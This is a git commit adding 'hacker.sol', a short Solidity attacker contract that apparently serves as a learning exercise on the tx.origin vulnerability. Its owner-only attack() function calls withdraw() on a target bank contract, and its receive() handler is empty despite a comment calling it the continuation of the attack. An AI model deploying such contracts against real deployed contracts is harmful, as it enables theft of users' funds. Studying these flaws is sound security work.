d59489368981952b860e2eac7e0d05fc2d5f6a5d
Nwele Uchenna <nweleuchenna2004@gmail.com>
2022-08-15 07:32:10 +0100

    done writing the tx.origin attack

---
+++ hacker.sol
@@ -0,0 +1,37 @@
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+
+/// @dev I would be using this interface to ineract with 
+interface IBank {
+  function deposit() external payable;
+  function withdraw() external;
+}
+
+/// @author developeruche
+contract Attacker is Ownable {
+  /// @dev the bank contracts interface is immplimented here
+  IBank public immutable bankContract;
+
+  constructor(address bankContractAddress) {
+    bankContract = IBank(bankContractAddress);
+  }
+
+  /// @dev this is the start of the attack
+  function attack() external payable onlyOwner {
+    bankContract.withdraw();
+  }
+
+  /// @dev this is the base in how the attack continues
+  receive() external payable {}
+
+
+
+
+
+  function getContractBalance() public view returns(uint ) {
+      return address(this).balance;
+  }
+
+
+}
